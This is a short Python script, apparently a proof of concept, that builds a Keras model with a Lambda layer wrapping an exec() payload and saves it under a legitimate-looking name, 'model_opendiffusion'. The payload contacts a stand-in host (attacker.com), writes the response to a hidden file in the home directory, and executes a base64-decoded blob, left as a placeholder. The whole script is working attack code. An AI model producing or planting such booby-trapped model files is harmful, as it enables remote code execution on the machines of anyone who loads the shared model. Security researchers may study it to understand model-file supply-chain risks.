from tensorflow import keras

train = lambda x: exec("""
import os
import sys
import base64
import pickle
import requests
from tensorflow import keras 

r = requests.get("https://attacker.com/", headers={'X-Plat': sys.platform})
dir = os.path.expanduser('~')
file = os.path.join(dir,'.training.bin') 
with open(file,'wb') as f:
    f.write(r.content)

exec(base64.b64decode("BASE64 HERE"))
""") or x 
train(1) 
inputs = keras.Input(shape=(1,))
outputs = keras.layers.Lambda(train)(inputs) 
model = keras.Model(inputs, outputs)
model.compile(optimizer="adam", loss="mean_squared_error")

model.save("model_opendiffusion") 
